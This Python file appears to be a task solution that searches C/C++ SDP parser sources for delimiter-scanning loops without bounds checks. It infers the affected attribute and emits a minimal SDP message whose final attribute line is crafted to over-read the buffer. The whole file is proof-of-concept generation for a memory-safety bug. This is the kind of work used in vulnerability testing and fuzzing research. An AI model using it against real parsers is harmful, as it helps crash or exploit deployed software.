import os
import re
import tarfile
import zipfile
import tempfile
from bisect import bisect_right
from typing import Dict, List, Optional, Tuple


class Solution:
    _SRC_EXTS = {
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".inl", ".ipp"
    }

    _KNOWN_ATTRS = {
        "rtpmap",
        "fmtp",
        "rtcp-fb",
        "candidate",
        "ice-ufrag",
        "ice-pwd",
        "fingerprint",
        "ssrc",
        "ssrc-group",
        "msid",
        "mid",
        "extmap",
        "group",
        "setup",
        "rtcp-mux",
        "rtcp-rsize",
        "sendrecv",
        "sendonly",
        "recvonly",
        "inactive",
        "rid",
        "simulcast",
        "msid-semantic",
        "rtp",
        "rtcp",
    }

    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as td:
            root = self._prepare_sources(src_path, td)
            attr, delim = self._analyze(root)
            poc = self._build_poc(attr, delim)
            return poc

    def _prepare_sources(self, src_path: str, out_dir: str) -> str:
        if os.path.isdir(src_path):
            return src_path

        lower = src_path.lower()
        if lower.endswith((".tar.gz", ".tgz", ".tar", ".tar.bz2", ".tbz2", ".tar.xz", ".txz")):
            self._safe_extract_tar(src_path, out_dir)
        elif lower.endswith(".zip"):
            self._safe_extract_zip(src_path, out_dir)
        else:
            # Best-effort: try tarfile first, then zipfile
            try:
                self._safe_extract_tar(src_path, out_dir)
            except Exception:
                self._safe_extract_zip(src_path, out_dir)

        # If there is a single top-level directory, use it as root.
        try:
            entries = [e for e in os.listdir(out_dir) if not e.startswith(".")]
            if len(entries) == 1:
                p = os.path.join(out_dir, entries[0])
                if os.path.isdir(p):
                    return p
        except Exception:
            pass
        return out_dir

    def _safe_extract_tar(self, tar_path: str, out_dir: str) -> None:
        def is_within_directory(directory: str, target: str) -> bool:
            abs_directory = os.path.abspath(directory)
            abs_target = os.path.abspath(target)
            return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])

        with tarfile.open(tar_path, "r:*") as tf:
            for member in tf.getmembers():
                name = member.name
                if not name or name.startswith("/") or name.startswith("\\"):
                    continue
                if ".." in name.split("/"):
                    continue
                dest = os.path.join(out_dir, name)
                if not is_within_directory(out_dir, dest):
                    continue
                tf.extract(member, out_dir)

    def _safe_extract_zip(self, zip_path: str, out_dir: str) -> None:
        def is_safe_name(name: str) -> bool:
            if not name:
                return False
            if name.startswith("/") or name.startswith("\\"):
                return False
            parts = name.replace("\\", "/").split("/")
            if any(p == ".." for p in parts):
                return False
            return True

        with zipfile.ZipFile(zip_path, "r") as zf:
            for info in zf.infolist():
                name = info.filename
                if not is_safe_name(name):
                    continue
                zf.extract(info, out_dir)

    def _analyze(self, root: str) -> Tuple[str, str]:
        files: List[Tuple[str, str]] = []
        for path in self._iter_relevant_files(root):
            try:
                st = os.stat(path)
                if st.st_size <= 0 or st.st_size > 5_000_000:
                    continue
                with open(path, "rb") as f:
                    data = f.read()
                text = data.decode("utf-8", errors="ignore")
                if not text:
                    continue
                files.append((path, text))
            except Exception:
                continue

        candidates: List[Tuple[int, str, str, str]] = []  # (score, fn, attr, delim)

        fn_header_re = re.compile(
            r'(?m)^\s*(?:template\s*<[^>]*>\s*)?'
            r'(?:static\s+|inline\s+|constexpr\s+|friend\s+|virtual\s+|extern\s+)?'
            r'(?:[\w:\<\>\,\*\&\s]+?)\s+'
            r'(\w+)\s*\([^;{}]*\)\s*(?:const\s*)?\{'
        )

        while_re = re.compile(r'while\s*\(\s*([^\)]{1,200})\s*\)\s*\{?', re.MULTILINE)
        deref_re = re.compile(r"\*\s*([A-Za-z_]\w*)\s*(?:!=|==)\s*'(.{1})'")

        for path, text in files:
            if "while" not in text:
                continue
            headers = [(m.start(1), m.group(1)) for m in fn_header_re.finditer(text)]
            header_positions = [p for p, _ in headers]

            for wm in while_re.finditer(text):
                cond = wm.group(1)
                dm = deref_re.search(cond)
                if not dm:
                    continue
                var = dm.group(1)
                delim = dm.group(2)
                if delim == "\0":
                    continue
                # Skip if there's an explicit bounds/end check in condition
                cl = cond.lower()
                if "end" in cl or "size" in cl or "length" in cl:
                    # It may still be buggy, but deprioritize heavily; keep only if no direct compare with var
                    if re.search(rf"\b{re.escape(var)}\b\s*(?:!=|<|<=)\s*\w*end\w*", cond):
                        continue
                if re.search(rf"\b{re.escape(var)}\b\s*(?:!=|<|<=)\s*\w*end\w*", cond):
                    continue
                if re.search(rf"\b{re.escape(var)}\b\s*(?:!=|<|<=)\s*value\.(?:end|data)\b", cond):
                    continue

                # Ensure loop increments the same var soon after
                body_snip = text[wm.end():wm.end() + 400]
                if not (re.search(rf"\+\+\s*{re.escape(var)}\b", body_snip) or re.search(rf"\b{re.escape(var)}\s*\+\+", body_snip)):
                    continue

                # Ensure var likely points into "value" buffer
                pre = text[max(0, wm.start() - 500):wm.start()]
                pre_l = pre.lower()
                if "value" not in pre_l and "val" not in pre_l and "field" not in pre_l:
                    continue
                if not re.search(rf"\b{re.escape(var)}\b\s*=\s*[\w:\.]*value\.(?:data|begin)\s*\(", pre):
                    if not re.search(rf"\b{re.escape(var)}\b\s*=\s*value\.(?:data|begin)\s*\(", pre):
                        continue

                fn = self._function_for_offset(headers, header_positions, wm.start(0))
                if not fn:
                    continue

                attr = self._infer_attr_for_function(fn, files)
                score = 0
                fnl = fn.lower()
                score += 10 if ("parse" in fnl) else 0
                score += 8 if ("sdp" in fnl) else 0
                score += 5 if delim in {" ", "/", "=", ";", ":", ",", "\t"} else 0
                score += 20 if attr in self._KNOWN_ATTRS else 0
                if attr:
                    if self._attr_string_appears(attr, files):
                        score += 15
                    if "-" in attr:
                        score += 2
                else:
                    score -= 10

                # Prefer candidates from paths that look like core/parser/sdp
                pl = path.replace("\\", "/").lower()
                if "core" in pl:
                    score += 2
                if "parser" in pl:
                    score += 3
                if "/sdp" in pl or "sdp/" in pl:
                    score += 8

                candidates.append((score, fn, attr if attr else "", delim))

        if candidates:
            candidates.sort(key=lambda x: (-x[0], len(x[2]) if x[2] else 999, x[1]))
            best = candidates[0]
            best_attr = best[2] if best[2] else "rtpmap"
            best_delim = best[3]
            return best_attr, best_delim

        return "rtpmap", " "

    def _iter_relevant_files(self, root: str):
        for dirpath, dirnames, filenames in os.walk(root):
            dl = dirpath.replace("\\", "/").lower()
            if any(part in dl for part in ("/.git", "/build", "/out", "/bazel-", "/.cache", "/third_party/", "/third-party/", "/external/")):
                continue
            for fn in filenames:
                ext = os.path.splitext(fn)[1].lower()
                if ext not in self._SRC_EXTS:
                    continue
                p = os.path.join(dirpath, fn)
                pl = p.replace("\\", "/").lower()
                if "sdp" in pl or ("parser" in pl and "core" in pl):
                    yield p

    def _function_for_offset(
        self,
        headers: List[Tuple[int, str]],
        header_positions: List[int],
        offset: int
    ) -> Optional[str]:
        if not headers:
            return None
        i = bisect_right(header_positions, offset) - 1
        if i < 0:
            return None
        return headers[i][1]

    def _camel_to_attr(self, fn: str) -> str:
        name = fn
        for pref in ("Parse", "parse", "SdpParse", "SDPParse", "ParseSdp", "parse_sdp_", "parseSdp"):
            if name.startswith(pref):
                name = name[len(pref):]
                break
        for suf in ("Attribute", "Line", "Field", "Value", "Param", "Parameters"):
            if name.endswith(suf) and len(name) > len(suf) + 1:
                name = name[:-len(suf)]
                break
        name = name.strip("_")
        if not name:
            return ""
        tokens = re.findall(r"[A-Z]+(?![a-z])|[A-Z]?[a-z]+|\d+", name)
        if not tokens:
            return name.lower()
        attr = "-".join(t.lower() for t in tokens)
        attr = attr.replace("_", "-")
        attr = re.sub(r"-{2,}", "-", attr).strip("-")
        return attr

    def _attr_string_appears(self, attr: str, files: List[Tuple[str, str]]) -> bool:
        needle1 = f'"{attr}"'
        needle2 = f"'{attr}'"
        for _, text in files:
            if needle1 in text or needle2 in text:
                return True
        return False

    def _infer_attr_for_function(self, fn: str, files: List[Tuple[str, str]]) -> str:
        fn_attr = self._camel_to_attr(fn)
        if fn_attr and fn_attr in self._KNOWN_ATTRS:
            return fn_attr
        if fn_attr and self._attr_string_appears(fn_attr, files):
            return fn_attr

        # Try to infer from call sites: look for comparisons to string literals near fn( calls.
        fn_call_re = re.compile(r"\b" + re.escape(fn) + r"\s*\(")
        cmp_pat = re.compile(
            r'(?:==\s*"|strcmp\s*\(\s*[^,]+,\s*"|EqualsIgnoreCase\s*\(\s*[^,]+,\s*"|absl::EqualsIgnoreCase\s*\(\s*[^,]+,\s*")'
            r'([a-zA-Z0-9][a-zA-Z0-9\-]{1,30})"'
        )
        lit_pat = re.compile(r'"([a-zA-Z0-9][a-zA-Z0-9\-]{1,30})"')
        best = ""
        for _, text in files:
            for m in fn_call_re.finditer(text):
                start = max(0, m.start() - 500)
                end = min(len(text), m.start() + 200)
                snip = text[start:end]
                cm = list(cmp_pat.finditer(snip))
                if cm:
                    cand = cm[-1].group(1).lower()
                    if cand in self._KNOWN_ATTRS:
                        return cand
                    if len(cand) > len(best):
                        best = cand
                else:
                    lits = list(lit_pat.finditer(snip))
                    for lm in reversed(lits[-5:]):
                        cand = lm.group(1).lower()
                        if cand in self._KNOWN_ATTRS:
                            return cand
                        if cand and cand.count("-") <= 3 and len(cand) > len(best):
                            best = cand
        if best:
            return best
        return fn_attr if fn_attr else "rtpmap"

    def _construct_value(self, attr: str, delim: str) -> str:
        if delim == " " or delim == "\t":
            # Missing the expected space-separated field.
            if attr == "fingerprint":
                return "sha-256"
            return "0"
        if delim == "/":
            # Provide enough structure to reach a '/' scan (common in rtpmap).
            if attr == "rtpmap":
                return "0 a"
            return "0 a"
        if delim == "=":
            # Common in fmtp param parsing.
            if attr in {"fmtp", "rtcp-fb"}:
                return "0 a"
            return "a"
        if delim == ";":
            return "0 a=b"
        if delim == ":":
            # Could be fingerprint bytes or other colon-separated content.
            if attr == "fingerprint":
                return "sha-256 a"
            return "0 a"
        if delim == ",":
            return "0 a"
        return "0"

    def _build_poc(self, attr: str, delim: str) -> bytes:
        attr = (attr or "rtpmap").strip().lower()
        value = self._construct_value(attr, delim)
        # Minimal-ish SDP preamble with one media section; vulnerable line last, no trailing newline.
        pre = (
            "v=0\n"
            "o=- 0 0 IN IP4 127.0.0.1\n"
            "s=-\n"
            "t=0 0\n"
            "m=audio 9 RTP/AVP 0\n"
            "c=IN IP4 0.0.0.0\n"
        )
        line = f"a={attr}:{value}"
        return (pre + line).encode("ascii", errors="ignore")